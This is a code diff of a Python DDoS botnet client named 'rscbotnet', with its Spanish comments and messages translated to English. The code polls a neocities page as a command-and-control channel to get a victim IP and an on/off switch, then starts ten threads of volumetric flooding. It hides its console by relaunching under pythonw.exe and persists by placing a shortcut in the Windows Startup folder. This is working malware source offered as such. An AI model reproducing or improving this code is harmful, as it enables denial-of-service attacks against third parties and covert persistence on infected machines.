@@ -10,51 +10,46 @@ import subprocess
 
 try:
     import psutil
-    import win32com.client  # Para crear el acceso directo en el inicio
+    import win32com.client
 except ImportError:
-    print("Necesitas instalar 'psutil' y 'pywin32'. Ejecuta 'pip install psutil pywin32'.")
+    print("You need to install 'psutil' and 'pywin32'. Run 'pip install psutil pywin32'.")
 
-# Configuración global
-num_bots = 10  # Número de threads para el ataque
+num_bots = 10
 running = True
-data_limit = 1 * 1024**4  # Límite de 1 Terabyte por bot
+data_limit = 1 * 1024**4
 attack_type = "VOLUMETRIC"
 
-# Variables para verificar cambios en URLs
 previous_note_content = ""
 previous_victim_ip = ""
 
-# Función para obtener la IP del objetivo
 def fetch_target_ip():
     try:
         response = requests.get("https://rsc-site.neocities.org/victim")
         ip_address = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", response.text)
         if ip_address:
-            print(f"IP objetivo obtenida: {ip_address[0]}")
+            print(f"Target IP obtained: {ip_address[0]}")
             return ip_address[0]
         else:
-            print("No se encontró una IP válida en la URL de destino.")
+            print("No valid IP found at the target URL.")
             return None
     except Exception as e:
-        print("Error al obtener la IP del objetivo:", e)
+        print("Error fetching target IP:", e)
         return None
 
-# Función para verificar si el ataque está habilitado
 def is_attack_enabled():
     try:
         response = requests.get("https://rsc-site.neocities.org/note")
         enabled = "true" in response.text.lower()
-        print(f"Estado de habilitación de ataque: {enabled}")
+        print(f"Attack enabled status: {enabled}")
         return enabled
     except Exception as e:
-        print("Error al verificar el estado de habilitación del ataque:", e)
+        print("Error checking attack enabled status:", e)
         return False
 
-# Función de ataque ejecutada por cada bot
 def attack(bot_id, target_ip, packet_size=10240):
     total_data_sent = 0
     global running
-    print(f"Bot {bot_id} iniciando ataque a {target_ip}")  # Mensaje al iniciar el ataque
+    print(f"Bot {bot_id} initiating attack on {target_ip}")
     
     while total_data_sent < data_limit and running:
         try:
@@ -67,7 +62,6 @@ def attack(bot_id, target_ip, packet_size=10240):
         except Exception as e:
             print(f"Bot {bot_id}: Error -", e)
 
-# Función principal que ejecuta el ataque en bucle con un retraso
 def run_attack():
     global previous_note_content, previous_victim_ip
     while True:
@@ -80,7 +74,7 @@ def run_attack():
                     previous_note_content = "true" if current_attack_enabled else "false"
                     previous_victim_ip = current_victim_ip
                     
-                    print("Iniciando ataque debido a cambios detectados.")
+                    print("Initiating attack due to detected changes.")
                     threads = []
                     for i in range(num_bots):
                         bot_thread = threading.Thread(target=attack, args=(i, current_victim_ip))
@@ -90,14 +84,13 @@ def run_attack():
                     for thread in threads:
                         thread.join()
                 else:
-                    print("Condiciones cumplidas pero sin cambios desde la última ejecución.")
+                    print("Conditions met but no changes since the last run.")
             else:
-                print("Condiciones no cumplidas para el ataque (ataque no habilitado o sin IP objetivo).")
+                print("Conditions not met for attack (attack not enabled or no target IP).")
             time.sleep(63)
         except Exception as e:
-            print("Error durante la verificación de URL o ejecución del ataque:", e)
+            print("Error during URL check or attack execution:", e)
 
-# Función para verificar si el script ya se está ejecutando en segundo plano
 def is_running_in_background():
     current_pid = os.getpid()
     for process in psutil.process_iter(['pid', 'name', 'cmdline']):
@@ -108,46 +101,39 @@ def is_running_in_background():
             continue
     return False
 
-# Función para relanzar el script en segundo plano usando pythonw.exe
 def run_with_pythonw():
     if sys.platform == "win32" and "python.exe" in sys.executable:
-        # Determinar si el sistema es de 32 o 64 bits y ejecutar pythonw.exe
         pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
         subprocess.Popen([pythonw_path, os.path.abspath(__file__)])
-        sys.exit()  # Cierra el proceso actual para ocultar la terminal
+        sys.exit()
 
-# Función para añadir el script a la carpeta de inicio de Windows
 def add_to_startup():
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
     script_path = os.path.abspath(__file__)
     shortcut_path = os.path.join(startup_folder, 'rscbotnet.lnk')
 
-    # Verifica si el acceso directo ya existe
     if os.path.exists(shortcut_path):
-        print("El programa ya está configurado para iniciar automáticamente.")
+        print("The program is already set to start automatically.")
         return
 
     try:
-        # Crea un acceso directo en la carpeta de inicio
         shell = win32com.client.Dispatch("WScript.Shell")
         shortcut = shell.CreateShortcut(shortcut_path)
         shortcut.TargetPath = script_path
         shortcut.WorkingDirectory = os.path.dirname(script_path)
-        shortcut.IconLocation = script_path  # Opcional, si tienes un ícono personalizado
+        shortcut.IconLocation = script_path
         shortcut.save()
-        print("El programa se ha configurado para iniciar automáticamente.")
+        print("The program has been set to start automatically.")
     except Exception as e:
-        print("Error al añadir el programa al inicio automático:", e)
+        print("Error adding the program to startup:", e)
 
 if __name__ == "__main__":
-    # Añadir el script a inicio automático si aún no está agregado
     add_to_startup()
 
-    # Ejecuta en segundo plano con pythonw.exe si es necesario
     run_with_pythonw()
 
-    # Ejecuta el ataque en segundo plano si no se está ejecutando ya
     if not is_running_in_background():
         run_attack()
     else:
-        print("El script ya se está ejecutando en segundo plano.")
+        print("The script is already running in the background.")
+
